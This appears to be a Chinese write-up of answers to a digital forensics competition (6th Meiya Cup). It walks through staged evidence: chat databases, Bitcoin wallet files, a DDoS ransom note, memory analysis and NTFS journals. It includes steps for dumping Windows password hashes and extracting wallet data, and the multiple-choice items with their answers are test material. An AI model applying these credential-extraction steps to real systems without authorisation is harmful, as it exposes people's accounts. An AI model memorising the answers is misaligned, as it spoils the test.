<h2 id="64-私钥已在bitcoin-PNG中加密。私钥是甚么？"><a href="#64-私钥已在bitcoin-PNG中加密。私钥是甚么？" class="headerlink" title="64 私钥已在bitcoin.PNG中加密。私钥是甚么？"></a>64 私钥已在bitcoin.PNG中加密。私钥是甚么？</h2><table>
<thead>
<tr>
<th>私钥已在bitcoin.PNG中加密。私钥是甚么？</th>
<th>B</th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:NpqGc6yaEjPd7NgBBRz9yUAf447Ei74K8rwuxoia8paBjzDNKzZU;B:KzZUc6yaEjPd7NgBBRz9yUAf447Ei74K8rwuxoia8paBjzDNNpqG;C:NpqGKzZUc6yaEjPd7NgBBRz9yUAf447Ei74K8rwuxoia8paBjzDN;D:c6yaEjPd7NgBBRz9yUAf447Ei74K8rwuxoia8paBjzDNNpqGKzZU;E:c6yaEjPd7NgBBRz9yUAf447Ei74K8rwuxoia8paBjzDNNpqG</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>在笔记本上有一个纸写着密码 Aa654321，再用 apk 对图片进行解密，原理同个人资 格赛。最好准备个图片编辑工具，比如美图秀秀，强曝光的密码，可以降低亮度和对比 度后看的更清晰。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026323.png" alt="image-20211021151013261"></p>
<h2 id="65-apk文件“-flash-chat”的哈希值（SHA-256）是甚么？"><a href="#65-apk文件“-flash-chat”的哈希值（SHA-256）是甚么？" class="headerlink" title="65 *apk文件“  flash_chat”的哈希值（SHA-256）是甚么？"></a>65 *apk文件“  flash_chat”的哈希值（SHA-256）是甚么？</h2><table>
<thead>
<tr>
<th>apk文件“  flash_chat”的哈希值（SHA-256）是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:479aadba030b9f1b0165760881eaeed48330cb3dccc807fe482985a8370b0d5b;B:041a731249fa7bbaebd88651e0f5d2c4c3069c6ff8924b80579a2b160e387340;C:ae572eb1a59e9a8dc25ad02c15761532658747979e63ad356ec5b9c1f623b4bf;D:9eccf8ab9bf99a73df864c42ba813973d802c242a74cafeafac946ed43433d62;E:fea06d7dc08152c8153c99ef4e654b683ba02f3679193ff1fd991625cabab10f</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026324.png" alt="image-20211021153237363"></p>
<p>在Alice手机上找到了</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026325.png" alt="image-20211021153528031"></p>
<p>很多安装包的名字都是base.apk</p>
<h2 id="66"><a href="#66" class="headerlink" title="66"></a>66</h2><table>
<thead>
<tr>
<th>哪个文件包含“  flash_chat”聊天记录？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:userdata  (ExtX)/Root/data/co.splusbaby.flash_chat/databases/google_app_measurement_local.db;B:userdata  (ExtX)/Root/data/co.splusbaby.flash_chat/databases/firestore.%5BDEFAULT%5D.flash-chat-110d8.%28default%29;C:userdata  (ExtX)/Root/data/co.splusbaby.flash_chat/databases/google_app_measurement_local.db-journal;D:userdata  (ExtX)/Root/data/co.splusbaby.flash_chat/databases/firestore.%5BDEFAULT%5D.flash-chat-110d8.%28default%29-journal;E:msgstore.db</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>小众软件，厂商的取证软件无法解析，从答案路径找下去，检查数据库情况，数据库 一般是 sqlite 文件。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026326.png" alt="image-20211021163933802"></p>
<h2 id="67"><a href="#67" class="headerlink" title="67"></a>67</h2><table>
<thead>
<tr>
<th>从“ flash_chat”找到的Bob的Windows密码是甚么？(某些字符被刻意用*遮盖)</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:44<strong><em>6;B:77</em></strong>9;C:11<strong><em>3;D:pa*</em></strong>rd;E:ta****</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026327.png" alt="image-20211021165232797"></p>
<p>112233</p>
<h2 id="68"><a href="#68" class="headerlink" title="68"></a>68</h2><table>
<thead>
<tr>
<th>消息的消息号码(Message  ID)是甚么？</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:G2iytNuzajD4YU1MGVQz;B:0x04CM9o69pmKByxwnRj;C:j77xBc4hi8En7FTCPrDH;D:diPO4Huk2aymv2SdIubI;E:8XL2u5jIff5j1sKzGGvg</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026328.png" alt="image-20211021165326237"></p>
<h2 id="69"><a href="#69" class="headerlink" title="69"></a>69</h2><table>
<thead>
<tr>
<th>“  flash_chat”消息ID“ aGqBnI5Bxutv24SQvrBL”中的密码是甚么？(某些字符被刻意用*遮盖)</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:P@ss<strong><em>*;B:Hi</em></strong>ld;C:Hel<strong><em>ll;D:hel**</em></strong>ld;E:we****ne</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026329.png" alt="image-20211021165747242"></p>
<h2 id="70-从Bob-iMAC-桌面名为Wallet-dat-的档案中可以取得以下那一个比特币地址-某些字符被刻意用-遮盖"><a href="#70-从Bob-iMAC-桌面名为Wallet-dat-的档案中可以取得以下那一个比特币地址-某些字符被刻意用-遮盖" class="headerlink" title="70 从Bob  iMAC 桌面名为Wallet.dat 的档案中可以取得以下那一个比特币地址?(某些字符被刻意用*遮盖)"></a>70 从Bob  iMAC 桌面名为Wallet.dat 的档案中可以取得以下那一个比特币地址?(某些字符被刻意用*遮盖)</h2><table>
<thead>
<tr>
<th>从Bob  iMAC 桌面名为Wallet.dat 的档案中可以取得以下那一个比特币地址?(某些字符被刻意用*遮盖)</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:1L<strong>*WpEYvUi8FeG6BnXqfh1j</strong>gmJA1h1;B:<strong>1</strong>MzCeNJHw5<strong><em>J9vZexkweTtvKp8a1;C:351Wm</em></strong>npxKSWBwJQ3vXETVKFmus456kU;D:<strong>***fnLp7P8Vu7EA</strong>UJzkngnXxGMZWwo;E:以上都不对</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>看现场图片发现桌上的计算机是一台iMac，仿真一下用密码</p>
<p>‘<img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026330.png" alt="image-20211020161803698"></p>
<p>看出Bob的密码是Aa654321laptop仿真识别到该密码，试了试iMac仿真，无法重置密码，使用该密码可以登陆进去</p>
<p>或者在取证大师中搜索关键词wallet.dat</p>
<h2 id="71"><a href="#71" class="headerlink" title="71"></a>71</h2><table>
<thead>
<tr>
<th>从Wallet.dat档案中取得的比特币地址，那一个有接收及传送过比特币?(某些字符被刻意用*遮盖)</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:<strong>**p9c74rqN6ymzGwr9JB</strong>8CPaX2458w;B:<strong>1WmYyhnpxKSWBwJQ3vXETVKFm*</strong>56kU;C:<strong>**UTiN5T7yrYXonCu54fWLHDK</strong>Y7dS9;D:3Q<strong><em>qGRprZsWWCgLrLDKmwEcwYqX7J</em></strong>;E:以上都不对</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>仿真可在桌面上发现，接着导出拖进winhex搜即可</p>
<p>方法一：用正则在 winhex 上直接搜索（正则(1|3)[0-9,a-z,A-Z]{33,34}）</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026331.png" alt="image-20211021190316525"></p>
<p>方法二：<a href="https://github.com/magnux/pywallet">https://github.com/magnux/pywallet</a> 用这个软件跑</p>
<p>命令</p>
<pre><code>pywallet.py --datadir=D:\工具包\工具包\取证工具\pywallet-master\pywallet-master --wallet=oldwallet.dat --dumpwallet &gt;wallet.csv</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026332.png" alt="image-20211021191806318"></p>
<h2 id="72-以下那一个比特币接收或传送交易的哈希值与上述的比特币地址有直接关系？-某些字符被刻意用-遮盖"><a href="#72-以下那一个比特币接收或传送交易的哈希值与上述的比特币地址有直接关系？-某些字符被刻意用-遮盖" class="headerlink" title="72 以下那一个比特币接收或传送交易的哈希值与上述的比特币地址有直接关系？(某些字符被刻意用*遮盖)"></a>72 以下那一个比特币接收或传送交易的哈希值与上述的比特币地址有直接关系？(某些字符被刻意用*遮盖)</h2><table>
<thead>
<tr>
<th>以下那一个比特币接收或传送交易的哈希值与上述的比特币地址有直接关系？(某些字符被刻意用*遮盖)</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:ab<strong><em>*7eea6f1da83c0917602ba086e70b900</em></strong>b21c0067a96f88ec4775221f;B:7e515<strong>***fea70dc29a07fbaf410d7fa</strong>610c2a4593d6d11b81b26f37da6db;C:<strong><strong>0f61e1b80cc1086445c4d</strong></strong>a8ec9bde6500e2850fc134860b82c97288e;D:<strong>yaE**</strong>NgBBRz9yUAf447Ei74K8rwuxo55k1aBjzDNNpq22U9Kk;E:以上都不对</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>方法一：在 <a href="https://btc.tokenview.com/">https://btc.tokenview.com/</a> 或者 oklink.com 可进行查询，只有 A 项进行过交易</p>
<p>方法二：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026332.png" alt="image-20211021191806318"></p>
<h2 id="73"><a href="#73" class="headerlink" title="73"></a>73</h2><table>
<thead>
<tr>
<th>上述的比特币交易中所涉及多少比特币？</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:0.01282210 BTC;B:0.01459400  BTC;C:0.00175178 BTC;D:0.00234500 BTC;E:以上都不对.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026333.png" alt="image-20211021192111231"></p>
<p>查网站就行</p>
<h2 id="74"><a href="#74" class="headerlink" title="74"></a>74</h2><table>
<thead>
<tr>
<th>Bob iMac数据磁盘的哈希值（SHA-256）是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:29D4217939E37A4408FAE745363A4635A18CB0EE2E29771449E86F8BD7E7F839;B:29D4217939E37A4408FAE745363A4635A18CB0EE2E29771449E86F8BD7E7;C:D7E729D4217939E37A4408FAE745363A4635A18CB0EE2E29771449E86F8BF839;D:D7E7F83929D4217939E37A4408FAE745363A4635A18CB0EE2E29771449E86F8B;E:F83929D4217939E37A4408FAE745363A4635A18CB0EE2E29771449E86F8BD7E7.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>xways直接打开</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026334.png" alt="image-20211021192331573"></p>
<h1 id="团体赛Cole部分"><a href="#团体赛Cole部分" class="headerlink" title="团体赛Cole部分"></a>团体赛Cole部分</h1><h2 id="75-更多操作Cole桌上计算机的哈希值（SHA-1）是甚么？"><a href="#75-更多操作Cole桌上计算机的哈希值（SHA-1）是甚么？" class="headerlink" title="75 更多操作Cole桌上计算机的哈希值（SHA-1）是甚么？"></a>75 更多操作Cole桌上计算机的哈希值（SHA-1）是甚么？</h2><table>
<thead>
<tr>
<th>Cole桌上计算机的哈希值（SHA-1）是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:0D00A8A853B9001A9FC7BF89D9FBBA790C065CE2;B:0D22A8A853B9001A9FC7BF89D9FBBA795CE2;C:A8A853B9001A9FC7BF89D9FBBA790C065CE20D00;D:5CE20D00A8A853B9001A9FC7BF89D9FBBA790C06;E:5CE2A8A853B9001A9FC7BF89D9FBBA790C060D00.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026335.png" alt="image-20211021192845564"></p>
<h2 id="76"><a href="#76" class="headerlink" title="76"></a>76</h2><table>
<thead>
<tr>
<th>Cole桌上计算机的用户名是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:ADMIN;B:COLE;C:COLE-DESKTOP;D:COLE-PC;E:COLE-PC-841315.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026336.png" alt="image-20211021201731435"></p>
<h2 id="77"><a href="#77" class="headerlink" title="77"></a>77</h2><table>
<thead>
<tr>
<th>在Cole的桌上计算机中发现了多少潜在的受害者？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:100;B:150;C:200;D:250;E:300.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026337.png" alt="image-20211021202131537"></p>
<p>200个</p>
<h2 id="78"><a href="#78" class="headerlink" title="78"></a>78</h2><table>
<thead>
<tr>
<th>潜在受害者的数据被储存在哪里?(某些字符被刻意用*遮盖)</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Partition  3\secret\doc<strong>ent.txt;B:Partition 3\secrets\c</strong>tomer.txt;C:Partition  3\secrets\vi<strong>.txt;D:Partition 3\secrets\vi</strong>.zip;E:Partition  3\sec<em>ets\</em>ips.doc.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>可参考上题图</p>
<h2 id="79"><a href="#79" class="headerlink" title="79"></a>79</h2><table>
<thead>
<tr>
<th>预设浏览器何时安装？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:2019-10-01;B:2019-12-01;C:2019-12-07;D:2020-09-24;E:2020-09-28.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>感觉如果不精确到小时的话，看系统安装时间也是个好方法。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026338.png" alt="image-20211022084920059"></p>
<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><table>
<thead>
<tr>
<th>Cole桌上计算机上预设安装了甚么浏览器？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Chrome;B:Edge;C:Firefox;D:Internet  Explorer;E:Opera.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026339.png" alt="image-20211022084952940"></p>
<h2 id="81"><a href="#81" class="headerlink" title="81"></a>81</h2><table>
<thead>
<tr>
<th>上述储存浏览记录的默认浏览器,该文件档案的类型是什么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:bat;B:dat;C:History;D:places;E:Web.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026340.png" alt="image-20211022090213812"></p>
<p>找到浏览记录跳转源文件</p>
<h2 id="82"><a href="#82" class="headerlink" title="82"></a>82</h2><table>
<thead>
<tr>
<th>入侵Zello的证据文件是甚么？</th>
<th>E</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Event  log;B:Email;C:Pretech;D:Ransome note;E:WebCacheV01.dat.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026341.png" alt="image-20211022090255380"></p>
<p>历史记录源文件</p>
<h2 id="83"><a href="#83" class="headerlink" title="83"></a>83</h2><table>
<thead>
<tr>
<th>受感染网站的网址是什么?</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:<a href="http://www.apple.com;B:www.google.com;C:www.vmware.com">www.apple.com;B:www.google.com;C:www.vmware.com</a>;   D:<a href="http://fortess.com;E:http://zello-onlineshop.sytes.net">http://fortess.com;E:http://zello-onlineshop.sytes.net</a>.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>见上</p>
<h2 id="84"><a href="#84" class="headerlink" title="84"></a>84</h2><table>
<thead>
<tr>
<th>Cole桌上计算机上的DDoS勒索字条是甚么？(某些字符被刻意用*遮盖)</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:license.txt;B:Ransome Note  of <strong>OS.txt;C:Ransome Note of **OS.doc;D:edb.log;E:</strong>inst.log.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p> 仿真直接能看到，不仿真搜索关键词 DDoS 关键字也能找到。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026342.png" alt="image-20211022090528779"></p>
<h2 id="85"><a href="#85" class="headerlink" title="85"></a>85</h2><table>
<thead>
<tr>
<th>在Cole桌上计算机上发现的DDoS勒索字条中，比特币钱包地址是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:1L6fKWpEYvUi8FeG6BnXqfh1joAgmJA1h1;B:2A6fKWpEYvUi8FeG6BnXqAA1joAgmJA1h1;C:3F6fKWpEYvUi8FeG11nXqAA1joAgmJA1h1;D:5C6fKWpEYvUi8FeG6BnXqAA1joAgfJA1h1;E:A1h1KWpEYvUi8FeG6BnXqfh1joAgmJ1L6f.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026343.png" alt="image-20211022090645057"></p>
<h2 id="86-Cole笔记本计算机的哈希值（SHA-1）是甚么？"><a href="#86-Cole笔记本计算机的哈希值（SHA-1）是甚么？" class="headerlink" title="86 Cole笔记本计算机的哈希值（SHA-1）是甚么？"></a>86 Cole笔记本计算机的哈希值（SHA-1）是甚么？</h2><table>
<thead>
<tr>
<th>Cole笔记本计算机的哈希值（SHA-1）是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:2EF559C89F2C5E6A2E02CFF13DBD61E423B89CD2;B:2EF59CD259C89F2C5E6A2E02CFF13DBD61E423B8;C:59C89F2C5E6A2E02CFF13DBD61E423B82EF59CD2;D:8CO259C89F2C5E6A2E02CFF13DBD61E423B82EF5;E:9CD259C89F2C5E6A2E02CFF13DBD61E423B82EF5.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026344.png" alt="image-20211022090738257"></p>
<h2 id="87"><a href="#87" class="headerlink" title="87"></a>87</h2><table>
<thead>
<tr>
<th>Cole笔记本计算机有多少个用户帐户？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:2;B:3;C:4;D:5;E:6.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026345.png" alt="image-20211022090939223"></p>
<p>3个</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026346.png" alt="image-20211022091136570"></p>
<h2 id="88"><a href="#88" class="headerlink" title="88"></a>88</h2><table>
<thead>
<tr>
<th>当前登录用户帐户的用户名是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Administrator;B:Bob;C:Cole;D:Daniel;E:Guest.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026347.png" alt="image-20211022091107142"></p>
<h2 id="89"><a href="#89" class="headerlink" title="89"></a>89</h2><table>
<thead>
<tr>
<th>在Cole笔记本的随机存取记忆体中, 是甚么Windows配置文件？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:Win7SP1x64;B:Win7SP1x64_25000;C:Win7SP2x64;D:Win2008R2SP1x64_24418;E:Win2008R2SP2x64.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026348.png" alt="image-20211022092142781"></p>
<h2 id="90"><a href="#90" class="headerlink" title="90"></a>90</h2><table>
<thead>
<tr>
<th>用户密码的前5个字符是甚么？</th>
<th></th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:12345;B:78945;C:passw;D:P@ssw;E:qazws.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>两种方法：lsadump和hashdump再去在线md5解码</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026349.png" alt="image-20211022092542863"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026350.png" alt="image-20211022092525423"></p>
<h2 id="91"><a href="#91" class="headerlink" title="91"></a>91</h2><table>
<thead>
<tr>
<th>计算机中可疑的txt文件的名称是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:abc.txt;B:costomer.txt;C:secret.txt;D:vips.txt;E:No  suspicious file was found.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>显然是Vips.txt</p>
<h2 id="92"><a href="#92" class="headerlink" title="92"></a>92</h2><table>
<thead>
<tr>
<th>可疑txt文件曾经出现在哪个路径？</th>
<th>B</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:C:/Users/Cole;B:C:/Users/Cole/Desktop/;C:C:/Users/Cole/Desktop/Trade;D:E:/USB16GB;E:No  suspicious file was found.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026351.png" alt="image-20211022102036634"></p>
<h2 id="93"><a href="#93" class="headerlink" title="93"></a>93</h2><table>
<thead>
<tr>
<th>是否有任何证据表明该文件已执行？</th>
<th>C</th>
<th>3</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>高级</th>
<th>A:是的，因为与此文件相关的lnk文件在内存偏移量  (Memory Offset) 0xcd40e382中找到;B:是的，因为与此文件相关的lnk文件在内存偏移量 (Memory Offset)  0x117a86230中找到;C:是的，因为在Cole \ AppData \ Roaming \ Microsoft \ Windows \  Recent \中找到了与此文件相关的lnk文件;D:找不到执行证据，因为没有与txt文件相关的预取文件;E:找不到可疑文件和lnk文件.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>根据选项往回找</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026352.png" alt="image-20211022112049545"></p>
<p>最近访问记录找到该文件，并且看到有lnk文件生成，一般link文件生成说明该文件已经访问过</p>
<h2 id="94"><a href="#94" class="headerlink" title="94*"></a>94*</h2><table>
<thead>
<tr>
<th>以下哪个与上述可疑txt文件相关的发现是正确的？</th>
<th>A</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:在创建可疑txt文件之后，创建/访问了另一个txt文件;B:在创建另一个txt文件之后创建/访问该文件;C:Cole使用Microsoft  Word打开文件;D:无法确定与文件相关的时间事件;E:该文件是通过内部网络ip下载的.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>通过分析<br>//$Extend /UnJrnl/$J ，转换成日志，然后找文件的操作详情。<br>可以通过两个文件创建向后的时间来进行判断</p>
<blockquote>
<p><a href="http://www.360doc.com/content/21/0227/01/73897730_964172271.shtml">元文件</a>$UsnJrnl是变更日志文件，作用是记录文件发生的改变，文件一旦改变，其变化会记录在元文件$UsnJrnl中一个被命名为$J的数据属性中。$J数据属性具备稀疏属性，由变更日志项组成。$UsnJrnl中还有一个被命名为$Max的数据属性，用来记录有关用户日志的最大设置信息等参数。$UsnJrnl文件中$J数据属性的变更日志项结构见表4-89。表4-89　$J数据属性的变更日志项结构<img src="https://www.dgxue.com/huifu/img/huifu/image01356.jpeg" alt="元文件$UsnJrnl分析-数据恢复迷"></p>
</blockquote>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026353.png" alt="image-20211027204250710"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026354.png" alt="image-20211027204308296"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026355.png" alt="image-20211027204312926"> </p>
<p>或者可分析一下浏览器的历史记录</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026356.png" alt="image-20211031172329654"></p>
<p>可看到三分钟后又访问了customers.txt</p>
<h2 id="95"><a href="#95" class="headerlink" title="95"></a>95</h2><table>
<thead>
<tr>
<th>根据系统时间，Cole在2020-09-18  01:01:08 UTC + 0000左右用笔记本计算机做了甚么？</th>
<th>D</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:他创建了一个新的xls文件;B:他从USB复制了一些文件;C:他打开了一些txt文件;D:他删除了一些文件;E:没有.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
